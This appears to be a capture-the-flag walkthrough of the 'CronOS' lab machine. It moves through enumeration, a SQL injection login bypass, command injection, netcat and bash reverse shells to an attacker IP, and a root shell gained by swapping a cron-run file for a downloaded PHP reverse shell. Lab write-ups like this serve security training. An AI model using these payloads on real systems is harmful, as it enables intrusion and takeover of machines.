#######
CronOS
Enumeration DNS - HTTP
Subdomains
Root Crontab
SQL injection vulnerability.
SQL Injection Username'-- -
BURPSUIT REQUEST MANIPULATION
COMMAND INJECTION
EXPLOITING CROWNJOBS TO BECOMING ROOT VIA REVERSE SHELL
#######

1-Enummeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.227.211 -v
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
        |   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
        |_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
        53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
        | dns-nsid: 
        |_  bind.version: 9.10.3-P4-Ubuntu
        80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
        | http-methods: 
        |_  Supported Methods: POST OPTIONS GET HEAD
        |_http-server-header: Apache/2.4.18 (Ubuntu)
        |_http-title: Apache2 Ubuntu Default Page: It works
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Port 53 - DNS:
        dig any cronos.htb @10.129.227.211
            ns1.cronos.htb
            admin.cronos.htb

        We add the subdomains to "etc/hosts"

    Port 80:
        Via Burp SUite we found "cronos.htb" linked with the IP http://10.129.227.211/
        Apache 2.4.18 ((Ubuntu))

        gobuster dir -u http://cronos.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
            /css                  (Status: 301) [Size: 306] [--> http://cronos.htb/css/]
            /js                   (Status: 301) [Size: 305] [--> http://cronos.htb/js/]
            /server-status        (Status: 403) [Size: 298]


        ★]$ nikto -h http://cronos.htb/ 
            + /web.config: ASP config file is accessible.
            + /css/: Directory indexing found.
            + /css/: This might be interesting.


        admin.cronos.htb:
            It's a Login Page
            We will stry SQL MAP

            SQL MAP Admin page Steps:
                -We do A POST request with any credential via BurpSuite Interceptor
                -We Copy the POST request end we past into a file named "login.req"

            [★]$ sqlmap -r login.req 
                [11:34:35] [INFO] testing for SQL injection on POST parameter 'username'

                We try as username:  admin'-- -

            We successs.


2-Explloit Port 80 Admin Net Tools:
    Net Tools page offer to use ping or tracroute cmd, BUT we can add Linux command via BURPSUITE by changing POST Requests

    This Bash reverse shell doesn't work:
        bash -i >& /dev/tcp/10.10.14.77/4443 0>&1

    We will try with Netcat:
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.77 8081 >/tmp/f

        command=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.77+8081+>/tmp/f

    We send to the Repeater:
        nc -lvnp 8081

        We have a shell

        python -c 'import pty; pty.spawn("/bin/bash")'




2-Privilege Escaltion:
    2A-Enumeration
        $ uname -a
        Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

        Track the frequent cronjobs:
            for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;

            1 /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
            1 /usr/sbin/CRON -f
            1 php /var/www/laravel/artisan schedule:run


        The best place to uploads script in linux is "dev/shm" and create our folder to make sure we have the "x" rights:

        We upload LinEnum.sh:
            www-data@cronos:/dev/shm/stty$ wget -r http://10.10.14.77:443/linenum.sh

            Kali:
                python3 -m http.server 443

            LinEnum:
                -rwsr-sr-x 1 daemon daemon 51464 Jan 15  2016 /usr/bin/at

        We noticed a Cronjob with root priv every minutes:
            * * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

        And Also:
            www-data@cronos:/var/www/laravel$ ls -l artisan
            ls -l artisan
            -rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 artisan


    2B-EXPLOITING CROWNJOBS TO BECOMING ROOT VIA REVERSE SHELL:
        Try to replace this file "/var/www/laravel/artisan" with a PHP reverse shell:
            ->Thus, when the cron-job runs this file as user root , we will obtain a reverse shell as user root . 
                https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
           
        We can download the reverse shell file on the remote host using the wget utility. 
        We will traverse to the:
            /dev/shm/STTY directory for downloading the file as this directory is writable by all the users by default.
            cd /dev/shm/STTY
            wget 10.10.14.77:443/reverse.php

            Then replace /var/www/laravel/artisan file with the /tmp/php-reverse-shell.php .
                mv /dev/shm/STTY/reverse.php /var/www/laravel/artisan

        From our Kali:
            nc -nvlp 4443

        We are Root:
            # id root
            uid=0(root) gid=0(root) groups=0(root)
